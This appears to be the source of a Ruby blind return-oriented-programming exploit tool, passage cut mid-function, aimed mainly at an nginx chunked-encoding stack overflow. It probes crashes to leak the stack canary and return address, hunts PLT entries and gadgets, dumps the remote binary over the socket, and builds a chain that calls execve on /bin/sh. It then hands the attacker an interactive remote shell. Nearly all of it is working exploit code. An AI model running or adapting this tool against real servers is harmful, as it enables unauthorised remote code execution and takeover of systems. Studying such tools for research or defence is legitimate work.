#!/usr/bin/env ruby
# encoding: ASCII-8BIT

require 'socket'
require 'timeout'

RC_CRASH   = 1
RC_NOCRASH = 2
RC_INF	   = 3
RC_STUFF   = 4

TEXT	    = 0x400000
DEATH	    = 0x4242424242424242
VSYSCALL    = 0xffffffffff600000
STRCMP_WANT = 16
MAX_FD	    = 20
MAX_CONN    = 50
FD_USE	    = 30
SEND_SIZE   = 4096

GADGETS = { "syscall" => /\x0f\x05/,
	    "rax"     => /\x58\xc3/,
	    "rdx"     => /\x5a\xc3/,
	    "rsi"     => /\x5e\xc3/,
	  }

class Braille

def initialize
	@ip	= "127.0.0.1"
	@port	= 80
	@to	= 1
	@reqs	= 0
#	@rev	= true
	@endian	= ">" if @rev
#	@small  = true
	@max_fd = MAX_FD
end

def nginx_get_child()
	s = TCPSocket.new(@ip, @port)

	sz = 0xdeadbeefdeadbeeff.to_s(16)

	req =  "GET / HTTP/1.1\r\n"
	req << "Host: bla.com\r\n"
	req << "Transfer-Encoding: Chunked\r\n"
	req << "Connection: Keep-Alive\r\n"
	req << "\r\n"
	req << "#{sz}\r\n"

	s.puts(req)

	r = s.gets
	return nil if r == nil
	if not r.include? "200 OK"
		abort("Death")
	end

	cl = 0
	while true
		h = s.gets

		if h.include? "Content-Length: "
			cl = Integer(h.split()[1])
		end
		break if h == "\r\n"
	end

#	print("CL: #{cl}\n")
	stuff = s.read(cl)
#	print("Stuff (#{stuff})\n")

	return s
end

def check_alive(s)
        sl = 0.01
        rep = @to.to_f / 0.01
        rep = rep.to_i

        rep.times do
                begin
                        x = s.recv_nonblock(1)
                        return false if x.length == 0

                        print("\nDamn got stuff #{x.length} #{x}\n")
                        return false
                rescue Errno::EAGAIN
                        sleep(sl)
                rescue Errno::ECONNRESET
                        return false
		rescue IOError
			return false
                end
        end

        return true
end

def nginx_exp(data, raw)
	s = nil
	while s == nil
		begin
			s = nginx_get_child()
		rescue Errno::ECONNRESET
		end

		print("Bad child\n") if s == nil
	end

	d = "A" * 4096
	d << data

	s.write(d)
	s.flush()

	return s if raw

	return RC_CRASH if not check_alive(s)

        req = "0\r\n"
        req << "\r\n"
        req << "GET / HTTP/1.1\r\n"
        req << "Host: bla.com\r\n"
        req << "Transfer-Encoding: Chunked\r\n"
        req << "Connection: Keep-Alive\r\n"
        req << "\r\n"

        s.write(req)

	return RC_NOCRASH if not check_alive(s)
	return RC_INF
end

def ali_exp(stuff, raw)
	s = nil

	while s == nil
		begin
			s = TCPSocket.new(@ip, @port)
			break
		rescue Errno::ETIMEDOUT
			print("conn timeout\n")
		end
	end

	d = "A" * 32
	d << stuff

	s.write(d)
	s.flush()

	return s if raw

	begin
		timeout(@to) do
			stuff = s.recv(1)

			return RC_CRASH if stuff.length == 0
			return RC_NOCRASH if stuff == "O"
			return RC_STUFF
		end
	rescue Timeout::Error
		return RC_INF
	rescue Errno::ECONNRESET
		return RC_CRASH
	end

	abort("morte")
end

def mysql_do_get_child()
	s = TCPSocket.new(@ip, @port)
	b = s.recv(4096)

	return false if b.length == 0

#       dump(b)

	err = b[4]

        ver = b[5..-1]
        stuff = []
        salt = []

        for i in 0..(ver.length - 1)
                if ver[i] == "\0"
                        stuff = ver[i + 1..-1]
                        ver = ver[0..i]
                        break
                end
        end

	if err == "\xff"
		print("Error [#{ver}]\n")
		return false
	end

#       print("ver #{ver}\n")
        tid = stuff[0..4].unpack("L<")[0]
#       print("TID #{tid}\n")

        for i in 4..(stuff.length - 1)
                if stuff[i] == "\0"
                        salt = stuff[4..i - 1]
                        stuff = stuff[i + 1..-1]
                        break
                end
        end
#       print("Salt ")
#       dump(salt)

        flags = stuff[0..2].unpack("S<")[0]
#       print("Flags #{flags.to_s(16)}\n")

        if (flags & 0x800) == 0
                print("NO SSL\n")
                exit(1)
        end

        charset = stuff[2].unpack("C")[0]
#       print("Charset #{charset.to_s(16)}\n")

        data = ""
        data << [32 | 0x01000000].pack("L<")            # len | packet num
        data << [0x00008daa].pack("L<")                 # flags
        data << [0x40000000].pack("L<")                 # max packet size
        data << [charset].pack("C")                     # charset
        data << "\0" * 23

        #dump(data)

        s.write(data)

	return s
end

def mysql_get_child()
        s = nil
	b = nil
	attempts = 0

        while true
		attempts += 1

		if attempts > 100
			print("Givin up dude\n")
			exit(1)
		end

                begin
			s = mysql_do_get_child()
			break if s
                rescue Errno::ECONNREFUSED
		rescue Errno::ECONNRESET
                end
		sleep(0.1)
        end

        return s
end

def mysql_exp(stuff, raw)
        s = mysql_get_child()

        data = ""
        data << [0].pack("S>")                  # sz
        data << [1].pack("C")                   # hello
        data << [0x0301].pack("S>")             # ver
        data << [0].pack("S>")                  # cyph suit
        data << [0].pack("S>")                  # session id
        data << [stuff.length].pack("S>")       # random
        data << "A" * 0                         # cs
        data << "A" * 0                         # sess id
        data << stuff

        s.write(data)
	return s if raw

	begin
		timeout(@to) do
			buf = s.recv(2048)
			return RC_CRASH if buf.length == 0
			return RC_NOCRASH
		end
	rescue Errno::ECONNRESET
		return RC_CRASH
        rescue Timeout::Error
                return RC_INF
        end

	abort("MORTE")
end

def try_exp(stuff, raw = false)
	@reqs += 1

	set_canary(stuff)

	stuff = stuff.reverse() if @rev

	return nginx_exp(stuff, raw)
#	return ali_exp(stuff, raw)
#	return mysql_exp(stuff, raw)
end

def set_canary(data)
	return if not @canary

        can = [@canary].pack("Q#{@endian}")

        return if data.length < @canary_off + can.length

        for i in 0..(can.length - 1)
                data[@canary_off + i] = can[i]
        end
end

def load_state()
	begin
		File.open("state.bin", "r") { |file|
			print("Loading state\n")
			x = file.read
			x = Marshal.load(x)

			x.instance_variables.each do |var|
				val = x.instance_variable_get(var)
#				print("Setting #{var} to #{val}\n")
				instance_variable_set(var, val)
			end
		}
	rescue Errno::ENOENT
		@start = Time.now
	end
end

def save_state()
	x = Marshal.dump(self)
	File.open("state.bin", "w") { |file| file.write(x) }
end

def print_progress()
	now = Time.now

        elapsed = now - @start
        elapsed = elapsed.to_i

        print("\n==================\n")
        print("Reqs sent #{@reqs} time #{elapsed}\n")
        print("==================\n")

	save_state()
end

def do_step(step)
	print("Doing #{step.name}\n")
	step.call
	print_progress()
end

def try_exp_print(val, stuff, raw = false)
	print("\rTrying 0x#{val.to_s(16)} ... ")
	STDOUT.flush

	r = try_exp(stuff, raw)
	return r if raw

	print("ret\n") if r == RC_NOCRASH
	print("inf\n") if r == RC_INF
	print("stuff\n") if r == RC_STUFF

	return r
end

def find_overflow_len()
	ws = 8
	olen = ws

	while true
		stuff = "A" * olen

		r = try_exp_print(olen, stuff)
		break if r == RC_CRASH
		olen += ws
	end

	abort("unreliable") if olen == ws

	olen -= ws

	while true
		stuff = "A" * olen

		r = try_exp_print(olen, stuff)
		break if r == RC_CRASH
		olen += 1
	end

	olen -= 1

	@olen = olen

	print("\nFound overflow len #{olen}\n")
end

def stack_read_byte(stuff, inf = [])
	for i in 0..255
		s = ""
		s << stuff
		s << [i].pack("C")

		r = try_exp_print(i, s)
		inf << i if r == RC_INF

		return i if r == RC_NOCRASH
	end

	return nil
end

def stack_read_word(stuff, infw = [])
	word = ""

	s = ""
	s << stuff

	inf = {}

	8.times do
		infb = []

		w = stack_read_byte(s, infb)
		return nil if w == nil

		inf[word.length] = infb if not infb.empty?

		word << w
		s << w
	end

	for k, v in inf
		for b in v
			w = word.dup
			w[k] = [b].pack("C")
			w = w.unpack("Q#{@endian}")[0]

			infw << w
		end
	end

	return word.unpack("Q#{@endian}")[0]
end

def check_canary(words)
	return if words.empty?

	canary = words[0]

	return if (canary & 0xff) != 0

	zeros = 0

	0.upto(7) { |i|
		b = (canary >> i * 8) & 0xff
		zeros += 1 if b == 0
	}

	return if zeros > 2

	print("Possible canary #{canary.to_s(16)}\n")

	@canary = canary
	@canary_off = @olen
end

def found_rip(w)
	limit = TEXT + 0x600000

	if w > TEXT and w < limit
		@origin = TEXT
		return true
	end

	return false
end

def find_rip()
	words = []

	while true
		stuff = "A" * @olen
		stuff << words.pack("Q#{@endian}*")

		inf = []
		w = stack_read_word(stuff, inf)

		if w == nil
			print("Can't find stack word...\n")
			print("Setting stack to zeros\n")

			words = Array.new(words.length) { |i| 0 }
			next
		end

		print("Stack has #{w.to_s(16)}\n")
		words << w

		next if not found_rip(w)

		@rip = w
		@pad = words.length - 1
		@words = words[0..@pad]
		@large_text = (@rip - @origin) > 1024 * 1024
		@guard = @rip

		print("RIP IS 0x#{@rip.to_s(16)} pad #{@pad}" \
			+ " origin 0x#{@origin.to_s(16)}\n")

		if not inf.empty?
			for i in inf
				print("Infinite 0x#{i.to_s(16)}\n")
			end

			if @large_text
				@inf = inf[0]
				print("Using infinite 0x#{@inf.to_s(16)}\n")
			end
		end

		break
	end

	check_canary(words)
end

def try_rop_print(addr, rop, raw = false)
	stuff = ""

	fill = @olen

	if @rev
		fill = @olen - rop.length * 8 + 8 if
		rop = rop.reverse
	end

	abort("no space dude #{fill}") if fill < 0

	stuff << "A" * fill

	@pad.times do
		stuff << [DEATH].pack("Q<")
	end

	stuff << rop.pack("Q#{@endian}*")

	return try_exp_print(addr, stuff, raw)
end

def find_inf()
	addr = @origin

	addr += 0x1000

	while true
		addr += 0x10

		rop = []
		2.times do
			rop << addr
		end
		rop << DEATH

		r = try_rop_print(addr, rop)

		next if r != RC_INF

		next if not paranoid_inf(addr)

		@inf = addr
		print("Found inf at 0x#{@inf.to_s(16)}\n")
		break
	end
end

def try_plt(addr, inf = @inf)
	rop = []
	rop << addr
	rop << (addr + 6)
	rop << inf
	rop << inf

	r = try_rop_print(addr, rop)

	return false if r != RC_INF

	rop = []
	rop << addr
	rop << (addr + 6)
	rop << DEATH

	r = try_rop_print(addr, rop)
	return false if r != RC_CRASH

	return true
end

def paranoid_inf(inf)
	addr = inf

	5.times do
		addr += 0x10

		if try_plt(addr, inf)
			@plt = addr
			print("Found plt at 0x#{@plt.to_s(16)}\n")
			return true
		end
	end

	return false
end

def find_text_addr()
	addr = @origin
	skip = 0x10 * 200

	found = 3

	while found > 0
		addr += skip

		rop = []
		rop << addr
		rop << @inf
		rop << @inf
		rop << DEATH

		found -= 1 if try_rop_print(addr, rop) == RC_INF
	end

	print("Hit code around #{addr.to_s(16)}\n")

	return addr
end

def find_plt()
	ts = @inf - @origin
	print(".text size at least #{ts}\n")

	addr = @origin
	sz   = 0x10

	if @large_text
		print("Large .text found...\n")
		addr = find_text_addr()
		skip = 50

		sz *= skip
	end

	while true
		addr += sz

		next if not try_plt(addr)

		next if not paranoid_plt(addr)

		@plt = addr
		print("Found PLT at 0x#{@plt.to_s(16)}\n")
		break
	end

	find_good_inf()
end

def paranoid_plt(plt)
	for i in 0..5 do
		rop = []
		rop << (plt + 0xb)
		rop << i
		rop << @inf
		rop << @inf

		r = try_rop_print(i, rop)

		return true if r == RC_INF
	end

	return false
end

def find_depth()
	if @rev
		@depth = 0
		return
	end

	for i in 1..30
		rop = Array.new(i) { |j| @plt }

		if try_rop_print(i, rop) == RC_NOCRASH
			@depth = i
			print("Depth #{@depth}\n")
			return
		end
	end

	print("\nNope\n")
	@depth = 0
end

def check_instr(addr, rop, ret = @plt)
	r = rop.dup
	res = RC_NOCRASH

	if @depth == 0
		# protect inf
		if @rdi and @guard
			r << @rdi
			r << @guard
		end

		r << @inf
		r << @inf
		r << DEATH if not @rdi or not @small

		res = RC_INF
	else
		pad = @depth - r.length

		abort("damn!!!") if pad < 0

		pad.times do
			r << ret
		end
	end

	return try_rop_print(addr, r) == res
end

def get_dist(gadget, inc)
        dist = 0

        for i in 1..7
		addr = gadget + inc * i
		rop = []
		rop << addr
		6.times do
			rop << @plt
		end
		break if not check_instr(addr, rop)
                dist = i
        end

        return dist
end

def check_multi_pop(pop, off, num)
	ret = pop + 1

	addr = pop - off

	rop = []
	rop << addr
	num.times do
		rop << DEATH
	end

	return check_instr(addr, rop, ret)
end

def check_rdi(pop)
        return check_multi_pop(pop, 9, 6)
end

def paranoia_checks(rdi)
	rsi = rdi - 2
	ret = rdi + 1

	rop = []

	rop << rdi
	rop << 0
	rop << rsi
	rop << 0
	rop << 0

	if @small
		if @guard
			rop << rdi
			rop << @guard
		end

		return false if not check_instr(rdi, rop, ret)
		rop = []
	end

	rop << rdi
	rop << @rip
	rop << rsi
	rop << @rip
	rop << 0

	if @guard and @guard != @rip
		rop << rdi
		rop << @guard
	end

	return false if not check_instr(rdi, rop, ret)
	return true
end

def find_writable(rdi)
	addr = @rip
	skip = 0x10000

	print("Finding writable\n")

	while true
		rc = test_vsyscall(rdi, addr)
		break if rc == RC_INF

		addr += skip
	end

	@writable = addr
	@guard    = @writable

	print("Writable at #{@writable.to_s(16)}\n")
end

def check_rdi_bad_inf(rdi)
	try_rop_print(0x666, [DEATH])
	rc = test_vsyscall()

	return false if rc != RC_INF

	print("Yeah... it really is possible...\n")
	try_rop_print(0x666, [DEATH])
	writable = find_writable(rdi)

	return true
end

def verify_gadget(gadget)
        left  = get_dist(gadget, -1)
        right = get_dist(gadget, 1)

	# RDI screws up our inf?
	if left + right == 4
		ret = gadget + right + 2

		rop = []
		6.times do
			rop << ret
		end

		return false if not check_instr(ret, rop)

		rdi = ret - 1
		print("Possible pop rdi #{rdi.to_s(16)}" \
			" LEFT #{left} RIGHT #{right}\n")

		return false if not check_rdi_bad_inf(rdi)

		right += 2
	end

	return false if left + right != 6

	print("LEFT #{left} RIGHT #{right}\n")

	rdi = gadget + right - 1

	return false if not check_rdi(rdi)

	return false if not paranoia_checks(rdi)

        print("Found POP RDI #{rdi.to_s(16)}\n")

        @rdi = rdi

end

def find_gadget()
	addr = @plt + 0x200
	addr = @plt + 0x1000 # if @large_text

	while true
		addr += 7

		rop = []
		rop << addr
		6.times do
			rop << @plt
		end

		if check_instr(addr, rop)
			break if verify_gadget(addr)
		end
	end
end

def set_rdi(rop, rdi)
        rop << @rdi
        rop << rdi
end

def set_rsi(rop, rsi)
        rop << @rdi - 2
        rop << rsi
        rop << 0
end

def set_plt(rop, entry, arg1, arg2)
	set_rdi(rop, arg1)
	set_rsi(rop, arg2)
	set_plt_entry(rop, entry)
end

def set_plt_slot(rop, entry)
	rop << (@plt + 0xb)
	rop << entry
end

def set_plt_entry(rop, entry)
	if @small
		off = @plt + 0x10 * entry
		rop << off
	else
		set_plt_slot(rop, entry)
	end
end

def call_plt(entry, arg1, arg2)
        rop = []

	set_plt(rop, entry, arg1, arg2)

	return check_instr(entry, rop)
end

def try_strcmp(entry, good)
	if @small
		return false if entry == 0

		off = [1, -1]

		for o in off
			en = entry * o
			rc = do_try_strcmp(en, good)
			if rc == true
				return en
			end
		end

		return false
	end

	return entry if do_try_strcmp(entry, good)

	return false
end

def do_try_strcmp(entry, good)
	bad1 = 300
	bad2 = 500

        return false if call_plt(entry, bad1, bad2) != false
        return false if call_plt(entry, good, bad2) != false
        return false if call_plt(entry, bad1, good) != false

        return false if call_plt(entry, good, good) != true
        return false if call_plt(entry, VSYSCALL + 0x1000 - 1, good) != true

        return true
end

def find_strcmp()
	entry = 0

        good = @rip

	while true
		rc = try_strcmp(entry, good)
		if rc != false
			print("Found strcmp #{rc}\n")
			@strcmp = rc
			@strcmp_addr = good
			break
		end
		entry += 1
	end
end

def set_rdx(rop)
	set_plt(rop, @strcmp, @strcmp_addr, @strcmp_addr)
end

def set_plt_rdx(rop, entry, arg1, arg2)
	set_rdx(rop)
	set_plt(rop, entry, arg1, arg2)
end

def find_sock(conns)
	conns = conns.dup

	while not conns.empty?
		r = select(conns, nil, nil)
		ready = r[0]

		for s in ready
			begin
				stuff = s.recv(1024, Socket::MSG_PEEK)
				if stuff.length == 0
					conns.delete(s)
				else
					return s
				end
			rescue Errno::ECONNRESET
				conns.delete(s)
			end
		end
	end

	return false
end

def set_small_write(rop, fd, addr, write = @write)
	set_plt(rop, @strcmp, addr, addr)

	rop << @rdi
	rop << fd

	set_plt_entry(rop, write)
end

def do_write(write, addr)
	rop = []

	conns = []

	if @small
		set_small_write(rop, FD_USE, addr, write)

		MAX_CONN.times do
			conns << make_connection()
		end
	else
#		MAX_FD.downto(0) { |fd|
#			set_plt_rdx(rop, write, fd, addr)
#		}

		# compact version
		set_plt_rdx(rop, write, MAX_FD, addr)
		(MAX_FD - 1).downto(0) { |fd|
			set_rdi(rop, fd)
			set_plt_entry(rop, write)
		}

		rop << DEATH
	end

	sock = try_rop_print(write, rop, true)
	conns << sock

	stuff = nil

	begin
		timeout(@to) do
			sock = find_sock(conns)
			if sock
				stuff = sock.read
				stuff = nil if stuff.length == 0
			end
		end
	rescue Timeout::Error
	rescue Errno::ECONNRESET
	end

	for c in conns
		c.close()
	end

	return false if stuff == nil
	return stuff
end

def try_write(entry)
	return false if @small and entry == 0

	rop = []

	addr = @strcmp_addr

	stuff = do_write(entry, addr)

	if @small and stuff == false
		entry *= -1
		stuff = do_write(entry, addr)
	end

	return false if stuff == false

	@strcmp_len = stuff.length
	print("strcmp len #{@strcmp_len}\n")

	@write = entry

	return true
end

def make_connection()
	s = nil

	while true
	    begin
		s = TCPSocket.new(@ip, @port)
		if @banner_len and @banner_len > 0
			stuff = s.recv(1024)
			if stuff.length != @banner_len
				print("bad client...\n")

				rop = Array.new(10) { |j| DEATH }

				while try_rop_print(0x666, rop) != RC_CRASH
					print("Trying to crash...\n")
				end
			end
		end
		break
	    rescue Errno::ECONNREFUSED
	    end
	end

	return s
end

def get_banner_len()
	return if @banner_len

	s = make_connection()

	begin
		timeout(@to) do
			stuff = s.recv(1024)
			@banner_len = stuff.length
		end
	rescue Timeout::Error
		@banner_len = 0
	end

	s.close()

	print("Banner len #{@banner_len}\n")
end

def find_plt_start()
	addr = @plt
	last_good = @plt
	bad = 0

	print("Finding PLT start\n")

	while true
		rop = []
		rop << @rdi
		rop << 7

		rop << (@rdi - 2)
		rop << 8
		rop << 0

		rop << addr

		if check_instr(addr, rop)
			last_good = addr
			bad = 0
		else
			bad += 1

			break if bad > 5
		end

		addr -= 0x10 * 10
	end

	@plt_start = last_good
	print("PLT start at #{@plt_start.to_s(16)}\n")

	diff = @plt - @plt_start
	diff /= 0x10

	@plt = @plt_start
	@strcmp += diff
end

def find_write()
	entry = 0

	find_plt_start() if @small and not @plt_start

	get_banner_len()

	while entry < 300
		if try_write(entry)
			print("\nFound write at #{@write} (wlen #{@strcmp_len})\n")
			break
		end

		entry += 1
	end

	abort("ded") if entry == 300
end

def do_find_fd(hint = -1)
	top = MAX_FD

	top = 50 if @small
	top += 1 if hint != -1

	top.downto(0) { |fd|
		rop = []

		fd = hint if hint != -1 and fd == top

		if @small
			set_small_write(rop, fd, @strcmp_addr)
		else
			set_plt_rdx(rop, @write, fd, @strcmp_addr)
			rop << DEATH
		end

		s = try_rop_print(fd, rop, true)

		stuff = s.read
		next if stuff.length == 0

#		abort("dunno #{stuff.length}") if stuff.length != @strcmp_len
		@strcmp_len = stuff.length

		print("Found FD #{fd} (wlen #{@strcmp_len}\n")
		return fd
	}

	return -1
end

def find_fd()
	fds = {}

	fd = -1

	10.times do
		fd = do_find_fd(fd)
		next if fd == -1

		fds[fd] = 0 if not fds[fd]
		fds[fd] += 1
	end

	@fd     = fds.key(fds.values.max)
	@fd_min = fds.keys.min
	@fd_max = fds.keys.max

	print("Using FD #{@fd} range (#{@fd_min}-#{@fd_max})\n")

	@max_fd = @fd_max + 3
	print("Setting max fd to #{@max_fd}\n")
end

def find_good_rdx()
	addr = @strcmp_addr

	while @strcmp_len < STRCMP_WANT or not @strcmp_zero
		rop = []

		if @small
			set_small_write(rop, @fd, addr)
		else
			@max_fd.downto(0) { |fd|
				set_plt(rop, @strcmp, addr, addr)
				set_plt(rop, @write, fd, addr)
			}

			rop << DEATH
		end

		s = try_rop_print(addr, rop, true)
		stuff = s.read

		if stuff.length == 0 and not @strcmp_zero
			@strcmp_zero = addr
			print("Found strcmp zero #{@strcmp_zero.to_s(16)}\n")
			addr += 8
			next
		end

		if stuff.length >= STRCMP_WANT and stuff.length > @strcmp_len
			@strcmp_len  = stuff.length
			@strcmp_addr = addr
			print("Found strcmp len #{@strcmp_len} at " \
			      + " 0x#{@strcmp_addr.to_s(16)}\n")
		end

		print("Len #{stuff.length}\n")
		addr += stuff.length + 1
	end
end

def find_str(stuff)
	i = stuff.index(/[[:alnum:]]{4,}\0[[:alnum:]]{4,}/)
	return if i == nil

	off = @bin.length - stuff.length + i - 1

	while off > 2
		if @bin[off] == "\0" and @bin[off - 1] == "\0"
			@dynstr = off
			print("Found dynstr at 0x#{@dynstr.to_s(16)}\n")
			return
		end

		off -= 1
	end

	abort("daemnwer")

	exit(1)
end

def find_sym(stuff)
	idx = @bin.rindex(/\0{24}/, @dynstr)

	abort() if idx == nil

	@dynsym = idx
	print("Found dynsym at 0x#{@dynsym.to_s(16)}\n")
end

def dump_sym(stuff)
	addr = @dynsym
	symlen = 24

	symtab = []

	while addr < @dynstr
		stuff = @bin[addr..(addr + symlen)].unpack("L<CCCCQ<")

		stri = stuff[0]
		type = stuff[1] & 0xf
		val  = stuff[-1]

#		print("STRI #{stri} Type #{type.to_s(16)} Val #{val.to_s(16)}\n")

		want = @dynstr + stri
		return if want >= @bin.length

		idx = @bin.index(/\0/, want)
		return if idx == nil

		name = ""
		if stri != 0
			name = @bin[want..(idx - 1)]
		end

		sym = { }
		sym['name'] = name
		sym['type'] = type
		sym['val']  = val

		symtab << sym
#		print("SYM #{sym}\n")

		addr += symlen
	end

	num = 0
	for sym in symtab
		print("Sym #{num} #{sym['name']} #{sym['type']}" \
		      + " #{sym['val'].to_s(16)}\n")
		num += 1
	end

	@symtab = symtab
end

def dump_rel(stuff)
	if not @rel
		idx = @bin.index(/(.{8}\07\0\0\0.{4}\0{8}){3}/, @dynstr)
		return if idx == nil

		print("Rel at 0x#{idx.to_s(16)}\n")
		@rel = idx
	end

	addr   = @rel
	symlen = 24
	done = false

	reltab = []

	while (addr + symlen) < @bin.length
		stuff = @bin[addr..(addr + symlen)].unpack("Q<L<L<")

		rel = {}
		rel['got']  = stuff[0]
		rel['type'] = stuff[1]
		rel['num'] = stuff[2]

		if rel['type'] != 7
			done = true
			break
		end

		abort("morte") if rel['num'] > @symtab.length
		sym = @symtab[rel['num']]

		rel['name'] = sym['name']

#		print("REL #{rel}\n")

		reltab << rel

		addr += 24
	end

	return if not done

	@pltf    = {}
	@got_end = 0

	slot = 0
	for rel in reltab
		print("Rel #{slot} #{rel['name']} 0x#{rel['got'].to_s(16)}\n")

		@pltf[rel['name']] = slot

		@got_end = rel['got'] if rel['got'] > @got_end

		slot += 1
	end

	@reltab = reltab
end

def find_gadgets(stuff, origin = @origin, gadgets = @gadgets)
	idx = @bin.length - stuff.length - 1

	idx = 0 if idx < 0

	for gadget, opcode in GADGETS
		i = @bin.index(opcode, idx)

		next if not i

		next if gadgets[gadget]

		i += origin

		gadgets[gadget] = i
		print("Found gadget #{gadget} at 0x#{i.to_s(16)}\n")
	end
end

def find_long_str(stuff)
	return if @gadgets['rdx']

	z = @bin.rindex("\0", @bin.length - stuff.length)
	return if z == nil

	len = @strcmp_len + 1

	# XXX not perfect - there could be a longer string waiting...
	r = @bin.index(/[^\0]{#{len},}/, z)
	return if r == nil

	e = @bin.index(/\0/, r)
	e = @bin.length if e == nil

	len  = e - r
	addr = @origin + r

	return if len < 32

	if len > @strcmp_len
		@strcmp_addr = addr
		@strcmp_len  = len
		print("Found longer strcmp #{@strcmp_addr.to_s(16)}")
		print(" len #{@strcmp_len}\n")

	end
end

def analyze_bin(stuff)
	@bin << stuff

	find_long_str(stuff)
	find_str(stuff) if not @dynstr
	find_sym(stuff) if @dynstr and not @dynsym
	dump_sym(stuff) if @dynsym and not @symtab
	dump_rel(stuff) if @symtab and not @reltab

	find_gadgets(stuff)
end

def dump_addr(addr)
	if @small
		rop = build_small_write(addr)
		s = try_rop_print(addr, rop, true)
		return s.read
	end

	rop = []

	send_size = @strcmp_len
	rdx       = @gadgets['rdx']

	0.upto(0) { |i|
	    @max_fd.downto(0) { |fd|
		if rdx
			send_size = SEND_SIZE
			rop << rdx
			rop << SEND_SIZE
		else
			set_rdx(rop)
		end

		set_plt(rop, @write, fd, addr + (i * send_size))
	    }
	}

	s = try_rop_print(addr, rop, true)

	stuff = s.read
	return stuff
end

def build_small_write(addr, rsi = nil, rdx = nil)
	if @gadgets
		rdx = @gadgets['rdx'] if rdx == nil
		rsi = @gadgets['rsi'] if rsi == nil
	end

	rop = []

	if rdx
		rop << rdx
		rop << SEND_SIZE
	else
		rop << @rdi
		rop << @strcmp_addr

		rop << rsi
		rop << @strcmp_addr

		set_plt_entry(rop, @strcmp)
	end

	rop << @rdi
	rop << @fd

	rop << rsi
	rop << addr

	set_plt_entry(rop, @write)

	return rop
end

def have_small_write()
	return true if not @small
	return false if not @gadgets

	rop = build_small_write(0x666)
	return false if rop == nil

	rl = rop.length * 8

	return rl <= (@olen + 8)
end

def find_rsi(rsi)
	rsi -= 1

	# it's either 0 if strcmp len < 16.  Otherwise it's 16.
	while true
		rsi += 1

		rop = build_small_write(@origin, rsi)
		s = try_rop_print(rsi, rop, true)

		stuff = ""
		begin timeout(@to) do
			stuff = s.read
		end rescue Timeout::Error
		end

		next if stuff.length == 0

#		abort("mortex") if stuff.length != @strcmp_len

		print("Got #{stuff.length}\n")

		abort("damn") if stuff[1..3] != "ELF"

		return rsi
	end
end

def find_rdx()
	print("Finding RDX or RSI\n")

	addr = @rip

	@bin = ""

	gadgets = {}

	while not have_small_write()
		rop = []
		set_small_write(rop, @fd, addr)

		s = try_rop_print(addr, rop, true)

		stuff = s.read
		stuff << "\0" if stuff.length == 0

		print("Got #{stuff.length}     \r")

		if stuff.length > @strcmp_len
			@strcmp_addr = addr
			@strcmp_len  = stuff.length

			print("Better strcmp len #{@strcmp_len}")
			print(" at 0x#{@strcmp_addr}\n")
		end

		@bin = stuff
		find_gadgets(stuff, addr, gadgets)

		rsi = gadgets['rsi']
		if rsi
			rsi = find_rsi(rsi)
			print("POP RSI actually at #{rsi.to_s(16)}\n")
			@gadgets = {}
			@gadgets['rsi'] = rsi
		end

		addr += stuff.length
	end

	@bin = ""
end

def dump_bin()
	addr = @origin
	f = File.open("text.bin", "wb")

	@bin = ""
	@dynstr = @dynsym = @symtab = @reltab = false
	@gadgets = {} if not @gadgets

	while true
		stuff = dump_addr(addr)
		if stuff.length == 0
			abort("aintgottime")
			@max_fd += MAX_FD
			print("\nGot 0... increasing max fd to #{@max_fd}\n")
			@strcmp_zero = false
			find_good_rdx()
			next
		end

		print("Got #{stuff.length}     \r")

		f.write(stuff)
		f.flush()

		analyze_bin(stuff)
		break if can_exploit()

		addr += stuff.length
	end

	f.close()
end

def build_exp_rop(v = false, expfd = @fd)
	rop = []

	return nil if not @reltab
	return nil if not @pltf
	return nil if not @got_end

	fcntl  = @pltf['fcntl']
	read   = @pltf['read']
	sleep  = @pltf['sleep']
	usleep = @pltf['usleep']
	write  = @pltf['write']
	close  = @pltf['close']
	dup2   = @pltf['dup2']
	execve = @pltf['execve']

	syscall = @gadgets['syscall']
	rax     = @gadgets['rax']
	syscall = false if not rax

	writable = @got_end + 100

	print("Writable 0x#{writable.to_s(16)}\n") if v
	print("Socket #{expfd}\n") if v

	rop = []

	#
	# Part 1 - non mandatory stuff but good for stability.  E.g., set socket
	# to non blocking.  Or sleep
	#
	delay = 3

	if sleep
		print("sleep\n") if v
		set_plt(rop, sleep, delay, 0)
	elsif usleep
		print("usleep\n") if v
		set_plt(rop, usleep, 1000 * 1000 * delay, 0)
	end

	#
	# Part 2 - mandatory stuff
	# 1.  read /bin/sh to memory
	# 2.  set up FDs to stdin, stdout, stderr
	# 3.  execve /bin/sh
	return nil if read == nil or write == nil

	set_plt_rdx(rop, read, expfd, writable)
	set_plt_rdx(rop, write, expfd, writable)

	# set up FDs to 0, 1, 2
	if dup2
		print("dup2\n") if v
		0.upto(2) { |fd|
			set_plt(rop, dup2, expfd, fd)
		}
	elsif close and fcntl
		print("fcntl\n") if v
		0.upto(2) { |fd|
			set_plt(rop, close, fd, 0)
		}

		0.upto(2) { |fd|
			set_plt(rop, @strcmp, @strcmp_zero, @strcmp_zero)
			set_plt(rop, fcntl, expfd, 0)
		}
	else
		print("No way to set up FDs\n") if v
		return nil
	end

	# execve
	if execve
		print("execve\n") if v
		set_plt(rop, @strcmp, @strcmp_zero, @strcmp_zero)
		set_plt(rop, execve, writable, 0)
	elsif syscall
		print("syscall execve\n") if v
		set_plt(rop, @strcmp, @strcmp_zero, @strcmp_zero)
		set_rdi(rop, writable)
		set_rsi(rop, 0)

		rop << rax
		rop << 59 # execve

		rop << syscall
	else
		print("Can't execve\n") if v
		return nil
	end

	#
	# The end!
	#
	#
	rop << DEATH

	return rop
end

def can_exploit()
	return build_exp_rop() != nil
end

def dropshell(s)
	s.write("\n\nuname -a\nid\n")

        while true
                r = select([s, STDIN], nil, nil)

                if r[0][0] == s
                        x = s.recv(1024)

                        break if x.length == 0

                        print("#{x}")
                else   
                        x = STDIN.gets()

                        s.write(x)
                end
        end
end

def get_plt_base()
	write  = @plt + 0x10 * @write
	strcmp = @plt + 0x10 * @strcmp

	d = (strcmp - write) / 0x10

#	print("write #{write.to_s(16)} strcmp #{strcmp.to_s(16)}\n")
#	print("Slot dist #{d}\n")

	strcmp_opts = [ "strcmp", "strncmp", "strncasecmp" ]

	slot = 0
	for rel in @reltab
		if rel['name'] == "write" or rel['name'] == "send"
			sc = @reltab[slot + d]

			for s in strcmp_opts
				if sc['name'] == s
					return write - slot * 0x10
				end
			end
		end

		slot += 1
	end

	abort("damn dude you suck")
	return nil
end

def get_plt_addr(name)
	if not @pltbase
		@pltbase = get_plt_base()
		print("PLT base at 0x#{@pltbase.to_s(16)}\n")
	end

	plt = @pltbase

